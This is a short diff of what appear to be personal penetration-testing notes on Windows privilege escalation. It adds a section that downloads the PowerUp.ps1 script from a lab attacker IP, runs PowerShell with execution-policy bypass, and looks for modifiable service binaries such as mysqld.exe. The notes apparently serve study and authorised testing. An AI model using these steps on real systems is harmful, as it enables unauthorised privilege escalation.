@@ -156,7 +156,8 @@ icacls "C:\xampp\apache\bin\httpd.exe" or Get-ACL
           
 Find out how the service starts           
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
-          
+
+### Powerup
 PowerUp.ps1 detects priv escalation vectors
           
 iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
@@ -164,6 +165,10 @@ iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
  powershell -ep bypass
 
 .\PowerUp.ps1
+          
+if there's an error on abusefucntion, do the following
+$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
+$ModifiableFiles
 
  Get-ModifiableServiceFile 
 
